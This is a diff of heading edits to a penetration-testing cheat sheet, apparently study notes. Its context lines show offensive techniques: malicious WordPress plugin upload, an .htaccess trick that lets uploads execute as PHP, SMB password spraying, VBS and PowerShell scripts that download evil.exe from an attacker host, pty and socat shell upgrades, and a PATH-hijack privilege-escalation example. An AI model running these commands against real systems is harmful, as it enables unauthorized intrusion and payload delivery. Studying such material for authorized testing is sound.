@@ -300,7 +300,7 @@ If you get into the admin page, you can upload malicious plugins. Plugins are de
 - The plugin files will be accessible from the following link:
 `http://$target/wp-content/plugins/$zipName/$phpFileNmae`
 
-### when the web server won't execute a file type during uploads
+### Upload Execution Tip
 1. `echo "AddType application/x-httpd-php .xxx" > .htaccess`
 2. upload the .htaccess file
 3. then upload the .xxx file which can be executed as php
@@ -451,7 +451,7 @@ SMB         10.10.10.10   445    DC               [+] EXAMPLE.com\Username:Passw
 SMB         10.10.10.10   445    DC               [-] WMIEXEC: Could not retrieve output file, it may have been detected by AV. If it is still failing, try the 'wmi' protocol or another exec method
 ```
 
-### Check A Password when you have users
+### Password Spraying
 `nxe smb $IP -u users.txt -p 'password' -d domain.com --continue-on-success`
 
 ## 161,162 SNMP 
@@ -1494,7 +1494,7 @@ Downloads a file from a self hosted web server:
 SAMPLE USAGE:
 `cscript wget.vbs http://$kaliIP/evil.exe evil.exe` 
 
-### Similar script builder for powershell:
+### Powershell script builder
 	echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
 	echo $url = "http://[IP]/evil.exe" >>wget.ps1 
 	echo $file = "new-exploit.exe" >>wget.ps1 
@@ -1593,7 +1593,7 @@ Port scanning through a tunnel can take a while, and it may be only TCP scans th
 
 
 
-## Upgrading Shells to fully interactive
+## Upgrading Shell
 
 ### Python
 1. python -c 'import pty; pty.spawn("/bin/bash")'
@@ -1620,7 +1620,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ## Shell Upgrades
 
-### getting a better shell with socat
+### Socat
  1. From kali
 - sudo socat file:'tty',raw,echo=0 tcp-listen:443
  2. From target
@@ -1673,13 +1673,13 @@ print("Str = Str + " + '"' + str[i:i+n] + '"')
 
 A Linux PATH vulnerability typically arises when a malicious user is able to exploit the environment variable `PATH` to execute unintended commands. This is especially problematic when scripts or programs with elevated privileges (like root) inadvertently execute malicious code instead of legitimate system binaries. Here's a classic example of such a vulnerability:
 
-### Example: Misconfigured PATH in a Privileged Script
-
-#### Scenario:
+### Example: 
+Misconfigured PATH in a Privileged Script Scenario:
 
 Imagine there's a script that is run by the root user or by a setuid root binary. This script includes a line that calls a common command like `ls` without specifying the full path (e.g., `/bin/ls`). The script assumes that the `ls` command is being run from `/bin/ls`, but it doesn’t explicitly set the `PATH` variable.
 
-#### The Script (`/usr/local/bin/example_script.sh`):
+#### The Script 
+(`/usr/local/bin/example_script.sh`):
 ```
 #!/bin/bash
 
